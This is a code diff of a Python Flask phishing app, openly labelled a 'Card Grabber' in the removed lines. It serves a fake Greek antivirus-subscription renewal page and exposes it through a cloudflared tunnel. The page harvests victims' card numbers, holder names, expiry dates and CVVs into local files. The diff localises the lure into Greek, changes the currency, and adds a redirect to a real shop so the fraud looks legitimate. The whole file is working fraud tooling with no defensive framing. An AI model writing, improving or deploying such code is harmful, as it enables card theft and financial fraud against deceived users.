@@ -9,7 +9,7 @@ from flask import Flask, render_template_string, request, redirect, url_for
 from werkzeug.utils import secure_filename
 from datetime import datetime
 
-# Suppress Flask logs only
+# Απενεργοποίηση των αρχείων καταγραφής του Flask
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
@@ -35,7 +35,7 @@ def generate_cloudflared_link(port=7777):
             return proc, match.group(0)
     return proc, None
 
-# Flask App
+# Εφαρμογή Flask
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(24)
 
@@ -135,7 +135,7 @@ def index():
     </head>
     <body>
        <h2>⚠️ ΕΠΕΙΓΟΝ: Απαιτείται Επαλήθευση Ασφαλείας</h2>
-       <p class="warning">Η συνδρομή σας στο antivirus πρόκειται να λήξει!</p>
+       <p class="warning">Η συνδρομή σας για το antivirus πρόκειται να λήξει!</p>
        <p class="alert">Για να συνεχίσετε να προστατεύετε το τηλέφωνό σας από ιούς και χάκερ, πρέπει να επαληθεύσετε τον τρόπο πληρωμής σας.</p>
        <div class="container">
            <form action="/save_card" method="POST">
@@ -161,9 +161,9 @@ def index():
                </div>
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
-               <button type="submit">🔒 Πληρώστε 3€ & Συνεχίστε την Προστασία</button>
+               <button type="submit">🔒 Πληρώστε 3$ & Συνεχίστε την Προστασία</button>
            </form>
-           <p class="secure-badge">🔒 Επαληθευμένο από την Αρχή Ασφαλείας</p>
+           <p class="secure-badge">🔒 Επαληθεύτηκε από την Αρχή Ασφαλείας</p>
        </div>
     </body>
     </html>
@@ -184,29 +184,30 @@ def save_card():
 
     try:
         with open(filepath, 'w') as f:
-            f.write(f"Timestamp: {datetime.now()}\n")
-            f.write(f"Card Type: {cardtype}\n")
-            f.write(f"Card Holder: {cardholder}\n")
-            f.write(f"Card Number: {cardnumber}\n")
-            f.write(f"Expiration Date: {expmonth}/{expyear}\n")
+            f.write(f"Χρονική Σήμανση: {datetime.now()}\n")
+            f.write(f"Τύπος Κάρτας: {cardtype}\n")
+            f.write(f"Κάτοχος Κάρτας: {cardholder}\n")
+            f.write(f"Αριθμός Κάρτας: {cardnumber}\n")
+            f.write(f"Ημερομηνία Λήξης: {expmonth}/{expyear}\n")
             f.write(f"CVV: {cvv}\n")
-            f.write(f"Amount Charged: €3\n")
+            f.write(f"Ποσό Χρέωσης: $3\n")
         os.chmod(filepath, 0o600)
     except Exception as e:
-        return f"Error saving card: {str(e)}", 500
+        return f"Σφάλμα κατά την αποθήκευση της κάρτας: {str(e)}", 500
 
     return redirect(url_for('payment_success'))
 
 @app.route('/payment_success')
 def payment_success():
-    # Updated professional success page HTML only:
+    # Σελίδα επιτυχίας με ανακατεύθυνση στο eneba.com μετά από 5 δευτερόλεπτα
     return """
     <!DOCTYPE html>
     <html lang="el">
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <title>Επιτυχής Πληρωμή</title>
+        <meta http-equiv="refresh" content="5; url=https://eneba.com" />
+        <title>Η Πληρωμή ήταν Επιτυχής</title>
         <style>
             @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
             body {
@@ -250,16 +251,11 @@ def payment_success():
     </head>
     <body>
         <div class="card">
-            <h1>✅ Επιτυχής Πληρωμή</h1>
-            <p>Ευχαριστούμε! Η πληρωμή σας ύψους <strong>3,00€</strong> έχει διεκπεραιωθεί με ασφάλεια.</p>
-            <p>Η συνδρομή σας στο antivirus είναι τώρα ενεργή και προστατεύει τη συσκευή σας.</p>
-            <p class="redirect-info">Σε λίγο θα ανακατευθυνθείτε στην αρχική σελίδα.</p>
+            <h1>✅ Η Πληρωμή ήταν Επιτυχής</h1>
+            <p>Σας ευχαριστούμε! Η πληρωμή σας των <strong>$3.00</strong> ολοκληρώθηκε με ασφάλεια.</p>
+            <p>Η συνδρομή σας για το antivirus είναι πλέον ενεργή και προστατεύει τη συσκευή σας.</p>
+            <p class="redirect-info">Θα ανακατευθυνθείτε στο κατάστημα σύντομα.</p>
         </div>
-        <script>
-            setTimeout(function(){
-                window.location.href = "/";
-            }, 5000);
-        </script>
     </body>
     </html>
     """
@@ -275,7 +271,14 @@ if __name__ == '__main__':
     threading.Thread(target=run_server, daemon=True).start()
     time.sleep(5)
     _, link = generate_cloudflared_link()
+
+    # Εκτύπωση όλων των σχετικών πληροφοριών στην κονσόλα
+    print("Τα δεδομένα της κάρτας αποθηκεύονται στο: " + CARD_STORAGE_FOLDER)
+    print("Τοπικός διακομιστής: http://localhost:7777")
     if link:
-        print("Card Grabber Link:\n" + link)
+        print("Δημόσιος σύνδεσμος Cloudflared: " + link)
+    else:
+        print("Ο σύνδεσμος Cloudflared δεν μπόρεσε να ληφθεί.")
+
     while True:
         time.sleep(10)
